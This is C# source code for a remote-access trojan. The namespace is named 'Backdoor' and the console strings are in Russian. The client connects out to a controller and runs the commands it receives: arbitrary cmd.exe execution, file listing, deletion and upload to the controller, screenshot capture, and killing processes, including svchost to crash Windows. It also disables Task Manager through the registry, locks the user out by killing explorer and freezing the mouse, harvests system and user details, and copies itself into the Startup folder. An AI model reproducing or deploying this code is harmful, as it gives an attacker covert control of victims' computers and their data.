using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Xml;
using System.Drawing;
using System.Threading;
using System.Collections.Generic;

namespace Backdoor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Привет это тестовая сборка Rat");
            Console.WriteLine("Консоль можно будет скрыть в настройках");
            var server = new Server(Settings.ipAdr, Settings.port);
            server.Connect();
        }

    }
    public class Server
    {
        private string adress = "127.0.0.1";
        private int port = 7777;
        private Socket conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);

        public Server(string adr, int sockPort)
        {
            adress = adr;
            port = sockPort;
        }

        public void Connect()
        {
            conn = null;
            conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);
            Console.WriteLine("Поиск соеденения: ");
            Console.WriteLine("...");
            while (true)
            {
                try
                {
                    IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(adress), port);
                    conn.Connect(ipEndPoint);
                    Console.WriteLine($"Подключено к адрес: {adress} порт: {port}");
                    Loop();
                    break;
                }
                catch (Exception e)
                {
                    var m = e.Message;
                }
            }
        }

        private void Loop()
        {
            while (true)
            {
                string data = null;

                byte[] bytes = new byte[0];
                //int bytesRec = 0;
                try
                {
                    bytes = ReceiveDataFromServer();
                  //  bytesRec = conn.Receive(bytes);
                }
                catch (Exception e) { Console.WriteLine($"Соеденение преравнно, ошибка {e.Message}"); Connect(); break; }

                CommandExecutor executor = new CommandExecutor();
                data = Encoding.UTF8.GetString(bytes);
                if (data == "test_connect") continue; 

                Console.Write("Полученный текст: " + data + "\n\n"); ;

                try
                {
                    if (data.StartsWith("ls"))
                    {
                        data = data.Remove(0, 2);
                        string path = ParseComand(data);
                        var files = executor.ScanDirectoryFromXml(path);
                        SendDataToServer(files);
                        continue;
                    }

                    if (data.StartsWith("rm"))
                    {
                        data = data.Remove(0, 2);
                        string path = ParseComand(data);
                        executor.RemoveFileOrDirectory(path);
                        SendDataToServer("Файл " + path + " удалён.");
                        continue;
                    }

                    if (data.StartsWith("start"))
                    {

                        data = data.Remove(0, 5);
                        string path = ParseComand(data);
                        executor.StartFile(path);
                        SendDataToServer("Процесс " + path + " запущён.");
                        continue;
                    }


                    if (data.StartsWith("pkill"))
                    {
                        data = data.Remove(0, 5);
                        var pname = ParseComand(data);
                        executor.pkill(pname);
                        SendDataToServer("Процесс с именем " + pname + " уничтожен");
                        continue;
                    }

                    if (data.StartsWith("tasklist") || data == "tasklist")
                    {
                        string tasks = executor.GetAllTasksInSysFromXml();
                        SendDataToServer(tasks);
                        continue;
                    }

                    if (data.StartsWith("cmd"))
                    {
                        data = data.Remove(0, 3);
                        string comm = ParseComand(data);
                        var result = executor.ExecuteCmdCommand(comm);
                        SendDataToServer(result);
                        continue;
                    }

                    if (data.StartsWith("msg"))
                    {
                        data = data.Remove(0, 3);
                        string msg = ParseComand(data);
                        executor.ShowUserMsg(msg);
                        SendDataToServer($"Сообщение отправлено");
                        continue;
                    }
                    if (data.StartsWith("enTaskmgr"))
                    {
                        data = data.Remove(0, 9);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.UnLockTaskMgr();
                            SendDataToServer($"Диспетчер задач включен");
                        }
                        if (comm == "false")
                        {
                            executor.LockTaskMgr();
                            SendDataToServer($"Диспетчер задач выключен");
                        }
                        continue;
                    }
                    if (data.StartsWith("bluescreen") || data == "bluescreen")
                    {
                        executor.CrashSystem();
                        SendDataToServer("Система успешно крашнута");
                        continue;
                    }
                    if (data.StartsWith("download"))
                    {
                        data = data.Remove(0, 3);
                        string comm = ParseComand(data);
                        conn.Send(executor.GetFileFroUpload(comm));
                        continue;
                    }
                    if (data.StartsWith("transl"))
                    {
                        var comm = ParseComand(data);
                        if (comm == "get")
                        {
                            SendDataToServer(executor.CaptureScreenAndTransleteToBytes());
                            continue;
                        }
                    }
                    if (data.StartsWith("block"))
                    {
                        data = data.Remove(0, 5);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.LockSystem();
                            SendDataToServer("заблокированно");
                            continue;
                        }
                        if (comm == "false")
                        {
                            executor.UnLockSystem();
                            SendDataToServer("разблокированно");
                            continue;
                        }
                        else
                        {
                            throw new Exception("блокировка системы: неверный аргумент");
                        }
                    }
                    if (data.StartsWith("curblock"))
                    {
                        data = data.Remove(0, 5);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.LockMouse();
                            SendDataToServer("курсор заблокирован");
                            continue;
                        }
                        if (comm == "false")
                        {
                            executor.UnLockMouse();
                            SendDataToServer("курсор разблокирован");
                            continue;
                        }
                        else
                        {
                            throw new Exception("блокировка курсора: неверный аргумент");
                        }
                    }
                    if (data.StartsWith("dirtyScreen"))
                    {
                        data = data.Remove(0, 11);
                        string comm = ParseComand(data);
                        if (comm.StartsWith("true"))
                        {
                            comm = comm.Remove(0, 5);
                            executor.SpamScreenFromWindows(comm);
                            SendDataToServer("экран замусорен");
                            continue;
                        }
                        if (comm.StartsWith("false"))
                        {
                            executor.DestroySpamWindows();
                            SendDataToServer("очищено");
                            continue;
                        }
                        else
                        {
                            throw new Exception("мусорить экран системы: неверный аргумент");
                        }
                    }
                    if (data.StartsWith("abort connection") || data == "abort connection")
                    {
                        Console.WriteLine($"Пользователь прервал соеденение");
                        SendDataToServer("Abort connection");
                        Connect();
                        break;
                    }
                    if (data.StartsWith("getsysInf"))
                    {
                        data = data.Remove(0, 10);
                        string comm = ParseComand(data);
                        if (comm.StartsWith("true"))
                        {
                            SendDataToServer(executor.GetSystemInformation(true));
                            continue;
                        }
                        if (comm.StartsWith("false"))
                        {
                            SendDataToServer(executor.GetSystemInformation(true));
                            continue;
                        }
                        else
                        {
                            throw new Exception("информация системы: неверный аргумент");
                        }
                    }
                }
                catch (Exception e)
                {
                    SendDataToServer("Ошибка: " + e.Message + " Sourse:" + e.Source);
                }
            }
        }
        public void SendDataToServer(string data)
        {
            char[] stringSize = new char[10];
            int size = Encoding.UTF8.GetBytes(data).Length;

            for (int i = 0; i < size.ToString().Length; i++)
            {
                stringSize[i] = size.ToString()[i];
            }
            byte[] buffer = Encoding.UTF8.GetBytes(new string(stringSize) + data);
            Console.Write($"На сервер отправлено {buffer.Length} байт, указано в заголвке {new string(stringSize)}");
            conn.Send(buffer);
        }
        public void SendDataToServer(byte[] data)
        {
            char[] stringSize = new char[10];
            int size = data.Length;

            for (int i = 0; i < size.ToString().Length; i++)
            {
                stringSize[i] = size.ToString()[i];
            }
            var bytesSize = Encoding.UTF8.GetBytes(new string(stringSize));
            byte[] buffer = new byte[bytesSize.Length + data.Length];

            Buffer.BlockCopy(bytesSize, 0, buffer, 0, bytesSize.Length);
            Buffer.BlockCopy(data, 0, buffer, bytesSize.Length, data.Length);
            Console.Write($"На сервер отправлено {buffer.Length} байт, указано в заголвке {new string(stringSize)}");
            conn.Send(buffer);
        }
        public byte[] ReceiveDataFromServer()
        {
            var bytesSize = new byte[10];

            conn.Receive(bytesSize);
            int size = int.Parse(Encoding.UTF8.GetString(bytesSize));

            byte[] bytes = new byte[size];

            int offset = 0;
            int remaining = size;
            while (remaining > 0)
            {
                int read = conn.Receive(bytes, offset, remaining, SocketFlags.None);//stream.Read(data, offset, remaining);
                if (read <= 0)
                    throw new System.IO.EndOfStreamException
                        (String.Format("End of stream reached with {0} bytes left to read", remaining));
                remaining -= read;
                offset += read;
            }
            return bytes;
        }
        public static string ParseComand(string allcommand, Char attribute = '$')
        {
            string commandBody = "";
            bool flag = false;
            for (int i = 0; i < allcommand.Length; i++)
            {
                if (flag)
                    commandBody += allcommand[i];
                if (allcommand[i] == attribute)
                    flag = true;
            }
            return commandBody;
        }
    }
    public class CommandExecutor
    {
        private static Thread blockMouseThread = null;
        private static List<Thread> SpamWindows = new List<Thread>();

        [System.Runtime.InteropServices.DllImport("user32")]
        private static extern int SetCursorPos(int x, int y);

        public CommandExecutor()
        {

        }
        public void pkill(int pid)
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].Id == pid)
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public void pkill(string pname)
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == pname)
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public string GetAllTasksInSysFromXml()
        {
            string tasks = "";

            var process = Process.GetProcesses();
            tasks += "<tasklist>";
            for (int i = 0; i < process.Length; i++)
            {
                tasks += "<task>" + process[i].ProcessName + "</task>";
            }
            tasks += "</tasklist>";
            return tasks;
        }
        public string ScanDirectoryFromXml(string path)
        {
            var dirFiles = Directory.GetFiles(path);
            var directoris = Directory.GetDirectories(path);
            string files = "";

            files += "<files> ";
            for (int i = 0; i < dirFiles.Length; i++)
            {
                files += $" <file{i}>" + Path.GetFileName(dirFiles[i]) + $"</file{i}>";
            }
            for (int i = 0; i < directoris.Length; i++)
            {
                files += $" <dir{i}>" + "/" + Path.GetFileName(directoris[i]) + $"</dir{i}>";
            }
            files += " </files>";
            return files;
        }
        public void RemoveFileOrDirectory(string path)
        {
            try { File.Delete(path); } catch { }
            try { Directory.Delete(path, true); } catch { }
        }
        public void StartFile(string path)
        {
            var t = new Thread(() => Process.Start(path));
            t.Start();
        }
        public byte[] GetFileFroUpload(string path)
        {
            return File.ReadAllBytes(path);
        }
        public string ExecuteCmdCommand(string comm)
        {
            var proc = new Process();
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.FileName = "CMD.exe";
            proc.StartInfo.Arguments = " /C " + comm;
            proc.Start();
            return proc.StandardOutput.ReadToEnd();
        }
        public void CrashSystem()
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == "svchost")
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public void ShowUserMsg(string docContent)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(docContent);

            XmlNode root = doc.FirstChild;

            var textMsg = "";
            var textSub = "";
            var textBut = "";
            var textIco = "";

            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    if (root.ChildNodes[i].Name == "text")
                        textMsg = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "subject")
                        textSub = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "but")
                        textBut = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "ico")
                        textIco = root.ChildNodes[i].InnerText;
                }
            }
            var t = new Thread(() => MessageBox.Show(textMsg, textSub, (MessageBoxButtons)int.Parse(textBut), MessageBoxIcon.Error));
            t.Start();
        }
        public byte[] CaptureScreenAndTransleteToBytes()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);


            Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);
            graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));

            bitmap = ResizeImg(1140, 641, bitmap);

            MemoryStream stream = new MemoryStream();
            bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
            Byte[] bytesForSend = stream.ToArray();

            return bytesForSend;
        }
        private void CreateSpamWindow(bool moveWindow)
        {
            var r = new Random();
            var window = new Form();
            window.Show();
            window.SetBounds(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), window.Width, window.Height);
            while (true)
            {
                if (moveWindow)
                {
                    window.SetBounds(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), window.Width, window.Height);
                }
                Thread.Sleep(r.Next(100, 600));
            }
        }
        public void SpamScreenFromWindows(string arguments)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(arguments);

            XmlNode root = doc.FirstChild;

            var windowsValue = 1;
            var moveWindows = false;

            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    if (root.ChildNodes[i].Name == "windowsValue")
                    {
                        windowsValue = int.Parse(root.ChildNodes[i].InnerText);
                    }
                    if(root.ChildNodes[i].Name == "moveWindows")
                    {
                        moveWindows = root.ChildNodes[i].InnerText == "True";
                    }
                }
            }
            for (int i = 0; i < windowsValue; i++)
            {
                Thread thread = new Thread(() => CreateSpamWindow(moveWindows));
                thread.Start();
                SpamWindows.Add(thread);
            }
        }
        public async void DestroySpamWindows()
        {
            for (int i = 0; i < SpamWindows.Count; i++)
            {
                await System.Threading.Tasks.Task.Run(() => SpamWindows[i].Abort());
            }
        }
        public void LockMouse()
        {
            if (blockMouseThread != null) return;
            blockMouseThread = new Thread(() => SetZeroMouseInInfLoop());
            blockMouseThread.Start();
        }
        public void UnLockMouse()
        {
            if (blockMouseThread != null) blockMouseThread.Abort();
            blockMouseThread = null;
        }
        public void LockSystem()
        {
            LockTaskMgr();
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == "Backdoor")
                {
                    continue;
                }
                if (process[i].ProcessName == "explorer")
                {
                    process[i].Kill();
                }
                if (!String.IsNullOrEmpty(process[i].MainWindowTitle))
                {
                    process[i].Kill();
                }
            }
            LockMouse();
        }
        public string GetSystemInformation(bool getip = false)
        {
            string str = "нету ip";
            if(getip)
                for (int i = 0; i < Dns.GetHostByName(Dns.GetHostName()).AddressList.Length; i++) str += ", " + Dns.GetHostByName(Dns.GetHostName()).AddressList[i];
            return 
$@"<sysInf> 
<ip>{str}</ip> 
<time>{DateTime.Now}</time>
<machineName>{Environment.MachineName}</machineName> 
<usName>{Environment.UserName}</usName> 
<buildNum>{Environment.Version.Build}</buildNum> 
<sys>{Environment.OSVersion}</sys> 
</sysInf>";
        }
        public void UnLockSystem()
        {
            StartFile("c:/Windows/explorer.exe");
            UnLockMouse();
        }
        public void LockTaskMgr()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
        @"Software\Microsoft\Windows\CurrentVersion\Policies\System");

            objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
        public void UnLockTaskMgr()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
        }
        public static void AddToStartUp()
        {
            var startPath = "c:/Users/VASUS/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
            var dir = Directory.GetCurrentDirectory() + "/Backdoor.exe";
            File.Copy(dir, startPath);
        }
        private void SetZeroMouseInInfLoop()
        {
            while (true)
            {
                Thread.Sleep(50);
                SetCursorPos(0, 0);
            }
        }
        private Bitmap ResizeImg(int newWidth, int newHeight, Bitmap imgToResize)
        {
            Bitmap b = new Bitmap(newWidth, newHeight);
            Graphics g = Graphics.FromImage((Image)b);
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;

            g.DrawImage(imgToResize, 0, 0, newWidth, newHeight);
            g.Dispose();

            return b;
        }
    }
}
